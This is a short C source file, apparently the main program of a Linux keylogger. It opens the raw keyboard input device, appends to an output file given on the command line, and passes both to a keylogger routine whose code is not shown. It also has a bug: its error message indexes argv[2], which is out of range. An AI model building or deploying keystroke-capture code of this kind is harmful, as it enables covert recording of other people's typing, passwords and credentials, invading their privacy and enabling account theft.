#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include "keylogger.h"

int main(int argc, char *argv[]){
    const char KEYBOARD_DEVICE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
    FILE *writeout;
    int keyboard;

    if(argc != 2){
        printf("Usage: %s [WRITEOUT-FILE]\n", argv[0]);
        return 1;
    }

    if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
        return 1;
    }
    if((writeout = fopen(argv[1], "a")) == NULL){
        printf("Error opening file %s: %s\n", argv[2], strerror(errno));
        return 1;
    }

    keylogger(keyboard, writeout);

    return 0;
}
